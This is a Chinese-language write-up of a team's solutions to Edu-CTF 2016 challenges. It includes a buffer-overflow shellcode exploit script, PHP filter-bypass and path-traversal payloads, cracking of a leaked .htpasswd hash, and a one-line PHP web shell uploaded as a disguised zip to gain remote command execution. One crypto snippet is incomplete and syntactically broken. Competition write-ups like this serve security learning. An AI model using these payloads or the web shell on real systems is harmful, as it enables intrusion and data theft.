Edu-CTF 2016 Write-up 
===
## Team: SWLiao
team member
- R04922091 李宜霖
- R04922159 王德凱
- R04922132 林修平
- R05922164 柯百嶽

🐻Misc 10 : Rilakkuma
---
> CTF{rilakkuma}

😇Pwnable 150 : start
---
[BGM] https://www.youtube.com/watch?v=bBzBZJwW90g
>
>nc ctf.pwnable.tw 8731
>
先讀60byte，蓋20個後跳到mov ecx,esp（0x08048087）
會leak stack address
然後再塞入shellcode，get shell
```python=
from pwn import *
import time
padding_length = 20
shell_code = asm(
"""
    xor eax,eax
    mov eax,0x0b
    xor ecx,ecx
    xor edx,edx
    int 0x80
""",arch="i386")
if __name__ == '__main__':
    print 'len:',len(shell_code)
    HOST = 'ctf.pwnable.tw'
    PORT = 8731
    binary = 'start'
    mode = raw_input('mode:\n') 
    if mode == 'r\n':
        r = remote(HOST,PORT)
    else:
        r = process('./'+binary)
    raw_input('time to attach')
#jump to mov ecx,esp
    payload = cyclic(padding_length)+p32(0x08048087)
    r.send(payload)
    time.sleep(0.1)
#leak stack address 
    get = r.recv()
    print repr(get)
    ad = get[20:24]#-0x04000000+0x18000000
    sh = ''
    for x in range(1,5):
        sh+=ad[-1*x]
    print repr(ad),'--->',repr(sh)
    sh = int(sh.encode('hex'),16)-0x4+0x18
    sh = str(hex(sh))
    get =  p32(int(get[20:24].encode('hex'),16)-0x04000000,endian='big')
    print 'yoo->',repr(get),repr(sh)
    mov = asm('mov ebx,'+sh,arch="i386")
    print repr(mov)
    shell_code = mov +shell_code
    payload = shell_code+'\x90\x90'+get+'/bin/sh\x00'
    r.sendline(payload)
    
    r.interactive()
	r.close()    
```
>CTF{Z3r0_1s_st4rt}


🔄Reverse 100 : AHK
---
> Try to decrypt the flag.
> Notice: The flag doesn't include 'CTF{}' after decryption, but you must add the prefix when submitting to scoreboard.

$ strings env.exe
拿到source:
```
 <COMPILER: v1.1.24.04>
:O:@a::04
:O:@b::7f
:O:@c::be
:O:@d::37
:O:@e::73
:O:@f::29
:O:@g::ff
:O:@h::a5
:O:@i::a9
:O:@j::2c
:O:@k::ef
:O:@l::d1
:O:@m::48
:O:@n::22
:O:@o::63
:O:@p::5a
:O:@q::fa
:O:@r::32
:O:@s::fa
:O:@t::98
:O:@u::3b
:O:@v::cd
:O:@w::25
:O:@x::fb
:O:@y::47
:O:@z::d2
:O:@0::05
:O:@1::b5
:O:@2::ba
:O:@3::09
:O:@4::e6
:O:@5::77
:O:@6::68
:O:@7::56
:O:@8::00
:O:@9::15
:O:@_::e4
```
把flag.enc 裡的
"d105bee6d1e4fa983b37092298fae422090937e47fe6faa9bee45a05a92298fa" 照上面對照decode完得到FLAG.
> CTF{l0c4l_stud3nts_n33d_b4sic_p0ints}

🔄Reverse 400 : caitlyn
---
> I wanna play a game ...
> nc 140.113.209.24 10003

$ nc 140.113.209.24 10003 看到有點像踩地雷的東西：
```
       0   1   2   3   4   5   6   7   8   9  

 0     -   -   -   -   1   1   1   1   -   -  
 1     2   2   1   -   1   -   1   2   4   4  
 2     -   -   3   1   1   1   2   2   -   -  
 3     3   -   -   1   -   -   1   -   3   2  
 4     2   3   4   2   1   1   3   3   2   -  
 5     1   -   2   -   1   1   -   -   2   -  
 6     1   1   3   2   2   1   3   -   3   1  
 7     -   -   2   -   2   1   2   3   -   1  
 8     -   -   2   -   2   1   -   3   2   2  
 9     -   -   1   1   1   1   1   2   -   1
```
我們用IDA pro 去trace code 看這遊戲怎麼玩，發現要在是地雷的"-" 上標"-1"，其餘的我們把它標成"0"即可
於是上github找了一個 [mineweeper](https://gist.github.com/mohd-akram/3057736)
```python=

from pwn import *
import os
HOST = '140.113.209.24'
PORT = 10003

def solver(w, h, count):
    r.recvline()
    r.recvline()
    matrix = []
    for i in range(w):
        get = r.recvline().split()
        matrix.append(get[1:])
    
    give_in = ""
    for row in matrix:
        for col in row:
            give_in += col
    print give_in

    wf = open('data/in_' + str(w) ,'w')
    wf.write(give_in)
    wf.close()
    os.system('cat '+'data/in_' + str(w) + '|python mines/mines.py mines ' + str(w) + ' ' +str(h) + ' ' + str(count) + '> ' +'data/out_' + str(w))
    rf = open('data/out_' + str(w), 'r')
    out = rf.read()
    out = out.split('\n')[1:-1]#first is space last is total possible arrangements
    print '\n',out 
    for y in range(h):
        for x in range(w):
            if out[y][x] == '1':
                matrix[y][x] = '-1'
            if matrix[y][x] == '-':
                matrix[y][x] = '0'
    print(matrix)

    payload = ""
    for y in range(h):
        for x in range(w):
            payload += matrix[y][x] + " "
    
    r.sendline(payload)

r = remote(HOST, PORT)

for i in range(1,10):
    solver(i * 10, i * 10, i * 100 * i / 5)
r.interactive()


```
解完get flag
> CTF{ZZZ_zzz_zZZ_Zzz_ZzZ_zZz_ZZz_zzZ}



🔓Crypto 200 : RSA
---
跟作業很類似，從下載壓縮檔的output裡面可以看到n, e, r
```
n: 88915379777904220480592965231356288056731383962858378813795992867325415494232591101369475346005319526467392759168718676817426236490049372700046953192242554849669083680644269807020713343649693493391967704982398710494816670896969853530390409751004044500179983368339771742667306000453312700864988959043510405757844065684630163017301645228843333095653510881118262362873430270092297097520114637905111719730735393337490859403819803866582550676871351609053866045219052425492955032713610577632707036033362957006618381769590533733351146385104861858114490180355083406077980747627293257655435678804509990810760526889137878205587
e: 7
c: 33547004061102933765282913425404261682238327617521894423858042865935039767875675735512344723213603573887370473383693327563182319798984035994305101686839405854379012054563399473920378199258727455889100240775458765741591285834899571449641363862656172916058027923879828042179863345070226311290655400141947947077690079794445176134575297310405553196629094734342974101672001182839224548502918599346959061769370335219922003654624018222027658644656892257011562533056026347569886327198025301011781604334991530103244042918463528464195368513652958397583022079775025392306142757745220532922312147367089660743115963881951574390262
n: 55707600774090993467374851857316305300030436386141338941812136355134868112063670892076795550491333517640006027697128344921751996640657798740943398482993621087206172559790114886103475826725195255786883532402812517927724246039123472169985218926541778620425455648238725640482141673965865275263443509293111259265237255657866658172258814760730330158296874137184914280735016763215617098922142914286008160236704321872323403948038613723151534759164540947239839141911565835185038007694634589198773639156512878942020428080191875604701555982828672287826967897885072108847380082231772647668766618356553028399744763910482594463107
e: 1944438943
c: 43742649579312772703711284058294379872038923987309755657800413160793970356493310853550640602097932135388314559605084837263001473002055248379645245675386746771950190843357317180822826191854073484809760359511484409478193736292102425492652988507665846379221244088951938052711311463527576580256191273811493549185826232142040465686906255802180288411203775983152667171712489879771377695541326610318536246173444189804312174600410801499321620262437864979794888651624811741049243263581051438339996109932385873087117433175694739245201078208718206079101887545273980979988298110862441535067831412887232996125691237352276479343551
n: 85937464834800440448779023483739705743537323986754525659171871858240147041569199865953053169478535993937225638362618068221300356308766381119980731903946196065980001660073172673803494616091263758904883730021398576375079808746326215740545415080710072793495247556868493661250598926986840339347929980665621131801861595219576239833573354164766697206670012421174002288583434197100677231770293635204060820570183428510363701508701159462299177870973708728822458568445338303275703746612609015298809130228012991654201519449008112224483594406117972259479473745702807289893719590497760090322584221980780225213891739876489083585757
e: 7
c: 48724332165995913977844906117462828935947440967477497532869304734595570809501780844474104204542070189595326149962631358840524405967630599424740127470047487809579688578439652891833857650069010469429281754988660601841048262206670010832293470413006066884666044871592149572826717231689874638175952285300678859957450045905563820292937930059940187095877407685747960745981120708262009261701257435482095335328558022086934884737516294416591076275810839606228010378127829469827002961345035432166638140158469081464567169557045581938190437636125430362289266619713266770139710693685316760826737106955358629832940545756799957927913
.
.
.
.
.
```
然後要方便做crt，就直接擷取e = 7的n跟c，其他的不理
做出來的值就可以再做處理
```python=
import math
from sympy.ntheory.modular import crt


def find_invpowAlt(x,n):
    low = 10 ** (len(str(x)) / n)
    high = low * 10

    while low < high:
        mid = (low + high) // 2
        if low < mid and mid**n < x:
            low = mid
        elif high > mid and mid**n > x:
            high = mid
        else:
            return mid
    return mid + 1


e = 7

n1 = 88915379777904220480592965231356288056731383962858378813795992867325415494232591101369475346005319526467392759168718676817426236490049372700046953192242554849669083680644269807020713343649693493391967704982398710494816670896969853530390409751004044500179983368339771742667306000453312700864988959043510405757844065684630163017301645228843333095653510881118262362873430270092297097520114637905111719730735393337490859403819803866582550676871351609053866045219052425492955032713610577632707036033362957006618381769590533733351146385104861858114490180355083406077980747627293257655435678804509990810760526889137878205587
c1 = 33547004061102933765282913425404261682238327617521894423858042865935039767875675735512344723213603573887370473383693327563182319798984035994305101686839405854379012054563399473920378199258727455889100240775458765741591285834899571449641363862656172916058027923879828042179863345070226311290655400141947947077690079794445176134575297310405553196629094734342974101672001182839224548502918599346959061769370335219922003654624018222027658644656892257011562533056026347569886327198025301011781604334991530103244042918463528464195368513652958397583022079775025392306142757745220532922312147367089660743115963881951574390262
n2 = 85937464834800440448779023483739705743537323986754525659171871858240147041569199865953053169478535993937225638362618068221300356308766381119980731903946196065980001660073172673803494616091263758904883730021398576375079808746326215740545415080710072793495247556868493661250598926986840339347929980665621131801861595219576239833573354164766697206670012421174002288583434197100677231770293635204060820570183428510363701508701159462299177870973708728822458568445338303275703746612609015298809130228012991654201519449008112224483594406117972259479473745702807289893719590497760090322584221980780225213891739876489083585757
c2 = 48724332165995913977844906117462828935947440967477497532869304734595570809501780844474104204542070189595326149962631358840524405967630599424740127470047487809579688578439652891833857650069010469429281754988660601841048262206670010832293470413006066884666044871592149572826717231689874638175952285300678859957450045905563820292937930059940187095877407685747960745981120708262009261701257435482095335328558022086934884737516294416591076275810839606228010378127829469827002961345035432166638140158469081464567169557045581938190437636125430362289266619713266770139710693685316760826737106955358629832940545756799957927913
n3 = 75161724624400680907344700366549962017585202517439688851108081386105811051501830342282922943512575434556882722635542694410146690660952844097279579396363925446192922960147531113032247663225473961541063426582774484535746061173779281358329491616170358789910335815704625511033752324457439099336888113779884363177850701040316726766755677133072225769203425981920980068994522696437466634233261921408363221074175645538995085332595443358694280430108910403248225085389002326566476180404432263432804686406458659495121577254207680509705087551038661699432196760794858878274901588872786596437228396471774316441000729164846333506349
c3 = 14169696545155822854937121913690858330271879875429917393512474698712174853322892075416792477196566749335257219142515453979929137860730968008611876889689315548596033486906819369177005114678765753306705546619958080967233534254074452905340283916248965272883713887670761194331607292243702599486481458106213274235078890289193989624803810853255653594169664624777348754298483104800886158711854828283841946903156505099294704768117151598058923523722241419194785356282943539017745496108482813263236945797269621840229814455199209879675309163607787334958891577595055762246343698558006863383466375502189420931418995279794373204392
n4 = 56868680688293676260355321083353789041475537734140633595933408997481186428795132040058374272112962910716673671774791927020035988017815500220112790364993030075059278171385947320096371629762708132941386013457467895072260231487325099497685051971295226767255428231166258001590038896723386065662613815270219738371363502766131292786008840470804378262352466288291034165588603196904548910977778174316040750498579826800379527767985738266939663213127824534919553009306515829389444733216483560488349518542496071176782491828899709634085763574740737021875781704682829448918310070084057529258510447229555167481960724140757065036309
c4 = 30573593511274586668680008169544388348952539044195095064077371904950788268808608391546586239197858470340677680364766128749981978852224537209742040798235704872691831557181874380739110783143115886266025871415777294027382295376514950396090912418221289825644942264463688252497003324495130475628343195716889755657330236877541425962074234149154681497766757510150932321808371306144519202710420754428459486241697628938802817159497599329405164687942898723546996742642523574815461061288050393227621910177000979254697997102507413052245594212935297283659391374567068538158948770160683494396513269663739504321365684236328624149609
n5 = 37392447517109699553636556010863604779108808239388722535340023098488823146374574992491330173077852622116290569997698398921962019283612903618009862978006891771549890711372643769395130442649590352873541827956615659259041830323057369845378603040036154195791520471589669668917488063638235537912397288458368005164503171736792713458686424680362671784040410720431683952308722160541058777957271912609712459986460518023444540959447153980907163818627865405453106531279729113474798405762228457912323106800035537075619649448205967933428622266811803268517529113715660280567348441379437468247703255175737588572324107352306236369699
c5 = 16209867591439871945542708911739363213137977561683807924481552819254149586073163507600264139376732145827194237508721477793480892343294998552096558791633032408078671338632943848399424060090611611772262129620193292824659774289663416494215610818812225205349287924402521373636649273093388021509357532971835568870675990050738530902209937727031875011220451343825857393861920162967931988526813185393237294722851861854593395259219985097104736118638215994702979377415518500301295962475060594553713316449477373653410478332114538699565821995916539529777274176659127165906972265353886751281292703760467171448150656307998879687123
n6 = 65256754988080624321862819578014507876138516586800580513722514108031954035036369498995388924880564699545393660624499461324475337600233716922682659842984105806653553786920890167020843565913411033147940820663991091844817976617875089892681435328012008786127071246362776071362465097046927729984768350661190732989058733520839596558866150738181740630160271432828557581044199123917927862385544043660381827088277186730068496617148727509329771193863819965757216964552060870635204781025902152779923625149008026646087219214146142946816045807520207277149929487889636997513072801036893962425841227848551603626041753808095499587793
c6 = 6428672768203872627146037238348656255370479649225154265727200147013870701145029809858889453516803803753952483032886229366309212251257202174369337333375981037901265468570562383204479053529346598996478562749663680332061033807242564972448397143709174693477421939763743143368675974579085421536126944809509991894430917122421721323215173824276437767157318268782721707527346
2040202069778283277975276391585716580423068347987039124606587371220380541449451798110489319629608165271477160680832772870788327442270722824789499884307465784845917895815368881662534085424334496399878812702246036478758806729871104846231820028678611425

a = crt([n1, n2, n3, n4, n5, n6], [c1, c2, c3, c4, c5, c6])[0]

a = find_invpowAlt(a,7)
#print a 

a = hex(a)
print a[2:len(a)-1].decode('hex')
```
crt出來兩個值，一個是source code `rsa.py`裡面的c，另一個是間距。
把`crt()[0]`記錄下來開七次方根(因為`e = 7`)，
就可以得到m的值，也就是FLAG被`encode('hex')`後、再轉int的值。

所以反向操作回去，把該值先換回hex，截掉開頭的`'0x'`跟結尾的`'L'`
再拿去做`decode('hex')`，就可以得到FLAG了

>CTF{C1ll4s$!c_c0o0omm0n_m0du1u$55_a7t@ck!!!#>_<}

🔓Crypto 200 : Lost
---
> lost.pcap

首先可以下載到一個pcap，用wireshark打開沒看到什麼，但好像又些資料。
簡單先用strings看一下，有一些用AES-CBC加密的flag、key。
提供了很多如下的資訊
```
KEY = **5**v*R***hE***
Plaintext = *h** i***he p!4int3x7 0f *E*-*B*
AES-CBC(KEY, Plaintext) = ******************************8452***a***a9*5e2*887d1***1*d*b***
AES-CBC(KEY, FLAG) = *c**a*56ed9**3c***54****f9****569e*f8*****7a*18***c*3d***a*e*1e4
```
最後組一組變成
```
Plaintext = Thi5 i$ 7he p!4int3x7 0f AES-CBC
KEY = Ad5xBvZR1HVhE6** 
AES-CBC(KEY, FLAG) = 9c2ea756ed9ca3c05d541f7df961b3569e5f85a3387a818ed4c23db57aeeb1e4
AES-CBC(KEY, Plaintext) = 1f****************************8452fe2ad18a9e5e26887d133a13d7b818
```
發現key只差兩位
還有某plaintext與其部份加密後的ciphertext
於是應該可以用暴力猜key
由於是CBC，會拿上一block的ciphertext當IV
可先用``Plaintext``前後個1byte與後面的block來猜key
key也是printable的
所以能猜到key，然後也可以推到IV
最後拿到key、IV
就能夠解FLAG了
```python=
def the_key(key, placeholder='\x00'):
    assert placeholder in key
    q = [array.array('c', key)]
    while q:
        key, q = q[0], q[1:]
        idx = key.index(placeholder)
        if key.count(placeholder) == 1:
            for i in ALPHA:
                key[idx] = i
                yield key[:]
        else:
            for i in ALPHA:
                key[idx] = i
                q.insert(0, key[:])

def AES_CBCdecrpty(key, msg, iv):
    aes_obj = AES.new(key, AES.MODE_CBC, iv)
    return aes_obj.decrypt(msg)
    
def solve(KEY, PLAIN, AES_KEY_PLAIN, AES_KEY_FLAG):
    sPLAIN = do_slice(PLAIN, len(KEY))
    sPLAIN_ENC = do_slice(AES_KEY_PLAIN, len(KEY) * 2)
    assert len(sPLAIN) == len(sPLAIN_ENC)
    for k in the_key(KEY):
        for i, (pn, cn) in reversed(tuple(enumerate(zip(sPLAIN[1:], sPLAIN_ENC[1:]), 1))
            cn = binascii.unhexlify(cn)# C_n
            cn_1 = AES_CBCdecrpty(k, cn, pn)# C_{n-1}
            cn_1_hex = binascii.hexlify(cn_1)
            if eq(sPLAIN_ENC[i - 1], cn_1_hex):
                sPLAIN_ENC[i - 1] = cn_1_hex
            else:
                break
    else:
            iv = AES_CBCd(k, cn_1, sPLAIN[0])
    return AES_CBCdecrpty(k, binascii.unhexlify(AES_KEY_FLAG), iv)
```

> CTF{0x52fec4c0afd8ffaebc93cbaa6}


🤖AEG 200 : AlphaPuzzle 💮
---
>Decode base64 encoded ELF binary from the server.
>And finish puzzles three times to capture the flag.
>
>nc 133.130.124.59 9991
>
>[Don't waste your time on this] https://www.youtube.com/watch?v=uuMNmHdr0Lg

>Hint:
>aHR0cHM6Ly91cmwuZml0L1hmVE9U

hint是google小姐說，恭喜你終於會解貝斯64= =
nc 上去它會給你一堆base64，然後開始問你問題
而上面那堆是這次跑的binary
我先下載了一份，用angr跑跑看
沒有很久，應該不會timeout
接下來就是接程式，跑angr
```python=
from pwn import *
import time
import angr
import base64
HOST = '133.130.124.59'
PORT = 9991

r = remote(HOST,PORT)
time.sleep(0.5)
test = r.recvuntil('base64\n')
for y in range(3):
    print test
    data = r.recvuntil('==')
    print data
    de = base64.b64decode(data)
    of = open('qq','w')
    of.write(de)
    of.close()

    target_address = 0x0000000000400AF5 #put addree here 
    p = angr.Project('qq', load_options={'auto_load_libs': False})

    pg = p.factory.path_group()
    pg.explore(find=target_address)
    ans = pg.found[0].state.posix.dumps(0).split('\n')[:-1]
    print ans
    for x in ans:
        r.sendline(x)
        r.recvuntil('Piece')
    if y !=2:
        r.recvuntil('GJ!\n')
r.interactive()
```

> CTF{5YW25a+m5pq05Yqb6Kej5aW95YOP5Lmf6Kej55qE5Ye65L6G}

🤖AEG 300 : oo 👉🏻👌🏻
---
>Try to decode base64 encoded elf from server.
>Let's oo together.
>
>nc 133.130.124.59 9992
![image alt](https://final.csie.ctf.tw/files/08fa4b085bf1e343049043cb46bca9db/oo.jpg)

一樣會噴base64encode的binary出來，載一個binary來看一下，發現這程式功能為先賦予1110個位置某個值，然後讓你輸入猜這些數值。
於是就用angr跑起來，去dump那些位置的值，然後上傳get shell。
```python=
from pwn import *
import time
import base64
import angr
HOST = '133.130.124.59'
PORT = 9992
r = remote(HOST,PORT)
time.sleep(0.5)
test = r.recvuntil('base64\n')
print test
data = r.recvuntil('\n\n')
print data
de = base64.b64decode(data)
of = open('qq','w')
of.write(de)
of.close()
stop_target = 0x000000000040333E
p = angr.Project('qq', load_options={'auto_load_libs': False})

pg = p.factory.path_group()
pg.explore(find=stop_target)
found = pg.found[0]
g1_base = 0x603A60 
g2_base = 0x6038C0
g3_base = 0x603AC0
g1 = []
for i in range(10):
    g1.append(int(found.state.se.any_int(found.state.memory.load(g1_base+(i*4), 1))))
print g1
for a in g1:
    r.sendline(str(a))
g2 = []
for i in range(100):
    g2.append(int(found.state.se.any_int(found.state.memory.load(g2_base+(i*4), 1))))
print g2
for a in g2:
    r.sendline(str(a))
g3 = []
#angr get int fail don't know why
for i in range(1000):
    get = found.state.se.any_str(found.state.memory.load(g3_base+(i*4), 4)).encode('hex')
    n_get = ''
    for i in range(4):
        n_get += get[7-(i*2+1)]
        n_get += get[7-(i*2)]
    g3.append(int(n_get,16))
print g3
for a in g3:
    r.sendline(str(a))
r.interactive()

```
不過一開始目錄在/tmp，ls出來的東西有點多，最後翻了一下，flag在``/opt/oo/flag``


> CTF{o_oo_ooo_th1s_1s_how_simple_acg_look_like}

🐟Web 100 : Admin Panel
---
> http://54.199.166.146/f31c286df3608f5b71ea528d7220974957bfb14d/

$ curl http://54.199.166.146/f31c286df3608f5b71ea528d7220974957bfb14d/panel.php 拿到Flag.
> CTF{Admin's_pane1_1s_0n_F1r3!?!?!}

🐟Web 200 : Hello
---
> http://54.199.166.146/258c634761ca928154687da257f68c5347ad68c3/

get source可以看source code
發現他有擋黑名單
```
$blacklist = array("system", "passthru", "exec", "read", "open", "eval", "backtick", "flag", "php", "`", "_");
```
發現它沒有擋```assert```
雖然有試過把```eval```某個字改成urlencode，但好像get變數不能這樣
所以get的值可以用urlencode避掉檢查

```
http://54.199.166.146/258c634761ca928154687da257f68c5347ad68c3/?assert=highlight%5ffile("%66lag.ph%70")
```
> CTF{bypass_php_filter_is_so_fuN!}


🐟Web 200 : Snoopy's flag
---
>http://54.199.166.146/699e46f901f0533e28b21b4a13e27e2f7b9092a2/

先在source 裡看到
```
image.php?p=snoopy1.jpg
```
得知圖片是從image.php，get拿到圖片
嘗試以下payload
```
?p=../image.php
?p=../index.php
?p=../.htaccess
?p=../admin/.htaccess
```
拿到檔案.htaccess
```
AuthType Basic
AuthName "Password Protected Area"
AuthUserFile /var/www/web3/admin/.htpasswd_which_you_should_not_know
Require valid-user
Options +Indexes
```
於是```?p=../admin/.htpasswd_which_you_should_not_know```
得到```secret_admin:K7WeKYm8O5MQI```
經過一番查詢，才知道那是unix裡一個叫做crypt的hash
使用工具john the ripper　得到密碼```!@#$%^&*```
到```/admin``` 用```secret_admin:!@#$%^&*```登入拿到flag
> CTF{apache_config_file_is_sensitive}

🐟Web 300 : Snoopy's Pics
---
> http://54.199.198.25/1e73b9bac0d4e522b0557fad209de3f9a8197bc4/

偶然發現這樣```http://54.199.198.25/1e73b9bac0d4e522b0557fad209de3f9a8197bc4/?p=php://filter/convert.base64-encode/resource=index```可以拿到source
於是把index home about 都拿下來看看
其中index如下
```php=
<?php

$FROM_INCLUDE = true;

$pages = array(
    // disabled
    // "upload_snoopy" => "Uploads",
    "about" => "About"
);

if (isset($_GET["p"]))
    $p = $_GET["p"];
else
    $p = "home";


if(strlen($p) > 100)
{
    die("parameter is too long");
}

?>

<!DOCTYPE html>
<html lang="en">
<?php
include "header.php";
include $p . ".php";
?>
</body>
</html>
```
發現有```upload_snoopy```，被註解起來了
於是下載來看
```php=
<?php
if (! $FROM_INCLUDE)
    exit('not allow direct access');

function RandomString()
{
    $characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $randstring = "";
    for ($i = 0; $i < 9; $i++) {
        $randstring .= $characters[rand(0, strlen($characters)-1)];
    }
    return $randstring;
}

$target_dir = "images/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 0;
$imageFileType = pathinfo($target_file, PATHINFO_EXTENSION);
$fsize = $_FILES['fileToUpload']['size'];
$newid = RandomString();
$newname = $newid . ".jpg";

if(isset($_FILES["fileToUpload"])) {
    if($imageFileType == "jpg")
    {
        $uploadOk = 1;
    }
    else
    {
        echo "<center><p>Sorry,we only accept jpg file</p></center>";
        $uploadOk = 0;
    }

    if(!($fsize >= 0 && $fsize <= 200000))
    {
        $uploadOk = 0;
        echo "<center><p>Sorry, the size too large.</p></center>";
    }
}

if($uploadOk)
{
    $newpath = $target_dir . $newname;

    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $newpath))
    {
        header('Location: ./images/' . $newid.'.jpg');
        exit();
    }
    else
    {
        echo "<center><p>Sorry, there was an error in uploading your file.</p></center>";
    }
}
?>

<!-- Page Content -->
<div class="container">
    <!-- Marketing Icons Section -->
    <div class="row">
        <form method="POST" enctype="multipart/form-data">
            <div class="form-group">
                <label class="control-label">Select a good Snoopy picture (JPG only)</label>
                <input id="input-1" name="fileToUpload" type="file" class="file">
            </div>
        </form>
    </div>
    <script>
    // initialize with defaults
    $("#input-1").fileinput();

    // with plugin options
    $("#input-1").fileinput({'showUpload':false, 'previewFileType':'any'});
    </script>
</div>
```
好像只檢查上傳的東西有沒有```.jpg```
於是寫了一個```php```
```php=
<?php system($_GET['cmd']);
```
改檔名，上傳，但沒有成功
好像是因為副檔名不是php，所以沒有解析
經過一陣google，把檔案```xx.php```包成```.zip```，然後再改檔名
上傳，然後用```http://54.199.198.25/1e73b9bac0d4e522b0557fad209de3f9a8197bc4/?p=zip://images/iINJVYTKo.jpg%23test&cmd=ls```

拿到```about.php css header.php home.php images img index.php js upload_snoopy.php```
翻了一下目錄，變成```http://54.199.198.25/1e73b9bac0d4e522b0557fad209de3f9a8197bc4/?p=zip://images/iINJVYTKo.jpg%23test&cmd=cat%20../../../flag```

> CTF{finally_got_RCE_but_do_you_have_enough_sleep?}



